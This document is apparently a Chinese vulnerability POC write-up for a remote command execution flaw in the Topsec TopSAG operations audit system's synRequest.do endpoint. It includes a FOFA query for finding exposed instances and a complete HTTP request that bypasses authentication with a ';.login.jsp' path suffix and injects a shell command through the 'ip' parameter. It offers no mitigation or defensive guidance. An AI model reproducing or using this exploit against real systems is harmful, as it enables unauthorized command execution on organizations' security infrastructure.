# 一、漏洞简介
天融信运维安全审计系统TopSAG是基于自主知识产权NGTOS安全操作系统平台和多年网络安全防护经验积累研发而成，系统以4A管理理念为基础、安全代理为核心，在运维管理领域持续创新，为客户提供事前预防、事中监控、事后审计的全方位运维安全解决方案，适用于政府、金融、能源、电信、交通、教育等行业。天融信运维安全审计系统synRequest存在远程命令执行漏洞

# 二、影响版本
+ 天融信运维安全审计系统

# 三、资产测绘
+ fofa`header="iam" && server="Apache-Coyote/"`
+ 特征

![image-20241027110055964](assets/image-20241027110055964.png)

# 四、漏洞复现
```plain
POST /iam/synRequest.do;.login.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Content-Length: 67

method=trace_route&w=1&ip=127.0.0.1|echo%20`whoami`%3b&m=10
```

![image-20241027110112047](assets/image-20241027110112047.png)

